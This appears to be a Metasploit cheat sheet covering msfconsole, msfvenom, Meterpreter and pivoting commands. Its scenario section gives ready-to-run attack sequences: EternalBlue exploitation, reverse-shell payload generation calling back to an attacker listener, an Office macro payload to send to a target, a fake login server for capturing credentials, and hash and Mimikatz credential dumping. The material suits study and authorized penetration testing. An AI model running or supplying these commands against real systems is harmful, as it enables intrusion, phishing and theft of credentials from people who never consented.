- It helps security professionals find, exploit, and validate vulnerabilities.
- `msfconsole` : The main interactive cli.
- Modules: Reusable pieces of code: exploits, payloads, auxiliaries, encoders, nops, post.
- Exploit: Code that triggers a vulnerability.
- Payload: The code delivered after exploitation (shell, Meterpreter).
- Encoder: Obfuscates payloads to evade detection.
- Auxiliary: Scanning, fuzzing, sniffing, DoS; No payload needed.
- Post: Modules for post-exploitation (credential harvesting, privilege escalation).
- Meterpreter: Advanced, dynamic payload that runs entirely in memory, offering powerful post-exploitation commands.
- Database: PostgreSQL backend for storing hosts, services, loot, credentials.
## Console
```bash
msfconsole
# -q to start quietly without banner
# -r /path/to/script.rc to load a resource script at startup
```
## `msfconsole` Commands

| Command                        | Description                                                                                  |
| ------------------------------ | -------------------------------------------------------------------------------------------- |
| `help` / `?`                   | Show help menu.                                                                              |
| `search <term>`                | Search modules. `search eternalblue`                                                         |
| `use <module_path>`            | Select a module. `use exploit/windows/smb/ms17_010_eternalblue`                              |
| `info`                         | Display module information.                                                                  |
| `show options`                 | Show required/optional module options.                                                       |
| `show payloads`                | Compatible payloads for the current exploit.                                                 |
| `set <OPTION> <value>`         | Set an option. `set RHOSTS 192.168.1.10`                                                     |
| `setg`                         | Set a global option (persists across modules).                                               |
| `unset <OPTION>`               | Clear an option.                                                                             |
| `unsetg`                       | Clear a global option.                                                                       |
| `run` / `exploit`              | Execute the module. Auxiliary uses `run`, exploits use `exploit` or `run -j` for background. |
| `check`                        | Check if target is vulnerable (if the module supports it).                                   |
| `sessions`                     | List active sessions.                                                                        |
| `sessions -i <ID>`             | Interact with a session.                                                                     |
| `background` / `bg`            | Background the current session.                                                              |
| `jobs`                         | List running jobs.                                                                           |
| `kill <job_id>`                | Kill a background job.                                                                       |
| `db_nmap`                      | Run `nmap` and store results in the db.                                                      |
| `hosts` / `services` / `creds` | Display stored information.                                                                  |
| `exit`                         | Quit `msfconsole`                                                                            |
## Payload Types
- Single: Self-contained. `windows/shell_bind_tcp`
- Stager: Small stage that downloads a larger Stage.
- Staged: Notation `windows/meterpreter/reverse_tcp` (uses stager + stage).
- Stageless: Notation `windows/meterpreter_reverse_tcp` (single blob, no separate stage).
- Common Payloads:
	- `windows/meterpreter/reverse_tcp`
	- `linux/x86/meterpreter/reverse_tcp`
	- `java/meterpreter/reverse_tcp`
	- `php/meterpreter_reverse_tcp`
	- `cmd/unix/reverse_bash`
## Workspace & Database
```bash
msfdb init                 # Initialise the database
msfconsole -q
db_status                  # Check connection
workspace -a test_env      # Create a workspace
workspace test_env         # Switch to it
db_nmap -sV 10.10.10.0/24  # Scan and import results
hosts                      # List hosts
services                   # List discovered services
```
## Generating Payloads
- `msfvenom` is the standalone payload generator. It replaced `msfpayload` and `msfencode`.
```bash
msfvenom -p <payload> [options] -f <format> -o <output_file>

# Windows reverse TCP Meterpreter exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

# Linux ELF binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell

# PHP one-liner
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw

# Python script
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw

# War file for Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f war -o shell.war

# List payloads or formats
msfvenom -l payloads
msfvenom -l formats
```

- **You must also start a listener.** Without a listener, the payload won’t have anyone to talk to. The listener is a module in Metasploit:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit
```
- This tells Metasploit: “Wait for a connection on 10.0.0.5:4444 that uses the windows/meterpreter/reverse_tcp protocol.” When the target runs shell.exe, the listener catches it and gives you a Meterpreter session.
## Resource Scripts
- Automate repetitive tasks with `.rc` files.
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 10
run
exit
```
- Run with `msfconsole -r scan.rc`.
- Inside the console, execute `resource scan.rc`.
## Meterpreter
- After an exploit succeeds (or a listener catches a reverse connection), Metasploit opens a **Session**. A session is your live connection to the target.
- 
```bash
sessions -l #(list) shows all open sessions with an ID number.
sessions -i 1 #(interact) brings you inside session 1, giving you a Meterpreter or shell prompt.
sessions -u <ID> # Upgrade a native shell to Meterpreter (on Windows).
```
Inside Meterpreter:

| Command                                              | Description                                                                                                                                                                                                                                                                                                                                                                       |
| ---------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sysinfo`                                            | System info.                                                                                                                                                                                                                                                                                                                                                                      |
| `getuid`                                             | Current user.                                                                                                                                                                                                                                                                                                                                                                     |
| `ps`                                                 | List all running processes. You’ll choose one to `migrate` to.                                                                                                                                                                                                                                                                                                                    |
| `migrate <PID>`                                      | Move the Meterpreter from the original exploited process (which might be unstable or about to close) to a long-running process like `explorer.exe`. If the first process dies, you lose the session. Migrating keeps your access alive.                                                                                                                                           |
| `hashdump`                                           | Dump SAM hashes (requires SYSTEM),                                                                                                                                                                                                                                                                                                                                                |
| `load kiwi`                                          | In-memory Mimikatz, load via `load kiwi`.                                                                                                                                                                                                                                                                                                                                         |
| `creds_all`                                          | Dumps all cached credentials using Mimikatz.                                                                                                                                                                                                                                                                                                                                      |
| `shell`                                              | Drop into a standard Windows `cmd.exe` or Linux `/bin/sh` shell. Use this for commands Meterpreter doesn’t have. Type `exit` to go back to Meterpreter.                                                                                                                                                                                                                           |
| `upload` / `download`                                | Transfer files.                                                                                                                                                                                                                                                                                                                                                                   |
| `portfwd add -L 0.0.0.0 -l 3389 -r <target> -p 3389` | **Pivoting example**: If the compromised machine has network access to another internal machine (10.10.12.5) that you can’t reach directly, this creates a tunnel. `-L 0.0.0.0 -l 3389` opens port 3389 on your attacker machine, and `-r 10.10.12.5 -p 3389` forwards traffic to that internal machine’s RDP. Now you can RDP to your localhost:3389 and reach the internal box. |
| `run post/windows/manage/migrate`                    | Metasploit post-module that automatically migrates to a safer process (usually a system service).                                                                                                                                                                                                                                                                                 |
| `background`                                         | Send the current Meterpreter session to the background and return to the `msfconsole` prompt. You can later `sessions -i` back.                                                                                                                                                                                                                                                   |
## Pivoting & Routing
- When you compromise a dual-homed host, route traffic through it.
- Then use auxiliary/scanner modules with target IPs in the internal network; they will be tunneled through the compromised host.
```bash
# In Meterpreter
run autoroute -s 10.10.12.0/24   # Add route to internal subnet
run autoroute -p                 # Print active routes

# In msfconsole
route add 10.10.12.0 255.255.255.0 1   # Session ID 1
route print
```
## Real-World Scenarios
### Exploiting EternalBlue (MS17-010)
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
check
exploit -j   # Background job
sessions -l
sessions -i 1
```
### Scanning & Enumerating
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 21,22,25,80,443,445,3389
set THREADS 50
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run
hosts
services
```
### Client-Side Attack (Office Macro)
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f vba -o macro.vba

# Paste into Word macro, send to target
# Set up listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j
```
### Credential Harvesting with a Fake Login Page
```bash
use auxiliary/server/capture/http_basic
set SRVHOST 0.0.0.0
set SRVPORT 80
set URIPATH /
run
# Collect credentials; access logs via `creds`
```
### Post-Exploitation; Dumping Hashes & Mimikatz
```bash
use post/windows/gather/hashdump
set SESSION 1
run

# or Meterpreter
load kiwi
creds_all
```
## `msfconsole` Command-Line Flags

| Flag | Description |
|------|-------------|
| `-q` | Quiet mode – no banner |
| `-h` | Help |
| `-r <file>` | Execute a resource file on startup |
| `-L` | List all modules |
| `-x "<commands>"` | Execute commands after startup |
| `-m <dir>` | Add an additional module directory |
| `-p <dir>` | Add a plugin directory |
| `-d` | Debug mode (verbose output) |
| `-n` | Disable database |
| `-D <db_type>` | Database type (e.g., postgresql) |
| `-y <path>` | YAML configuration file path |
| `-v` | Show version information |

## `msfvenom` Flags

| Flag                       | Description                                      | Example                              |
| -------------------------- | ------------------------------------------------ | ------------------------------------ |
| `-p, --payload <payload>`  | Payload to use                                   | `-p windows/meterpreter/reverse_tcp` |
| `-l, --list [type]`        | List modules (payloads, encoders, nops, formats) | `-l payloads`                        |
| `-f, --format <format>`    | Output format                                    | `-f exe`                             |
| `-e, --encoder <encoder>`  | Encoder to use                                   | `-e x86/shikata_ga_nai`              |
| `-a, --arch <arch>`        | Architecture (x86, x64, etc.)                    | `-a x64`                             |
| `-o, --out <path>`         | Save to file                                     | `-o shell.exe`                       |
| `-b, --bad-chars <chars>`  | Characters to avoid (e.g., \x00\x0a)             | `-b '\x00'`                          |
| `-i, --iterations <count>` | Number of encoding iterations                    | `-i 5`                               |
| `-x, --template <file>`    | Use executable template                          | `-x putty.exe`                       |
| `-k, --keep`               | Preserve template behaviour (combine with -x)    | `-k`                                 |
| `--platform <platform>`    | Target platform                                  | `--platform windows`                 |
| `--smallest`               | Generate smallest possible payload               |                                      |
| `-c, --add-code <path>`    | Add shellcode from file                          | `-c shellcode.bin`                   |
| `-n, --nopsled <length>`   | Prepend NOP sled of length                       | `-n 16`                              |
| `-s, --space <max>`        | Maximum payload size                             | `-s 320`                             |
| `-v, --var-name <name>`    | Variable name for certain formats (e.g., C)      | `-v shellcode`                       |
| `-h, --help`               | Show help                                        |                                      |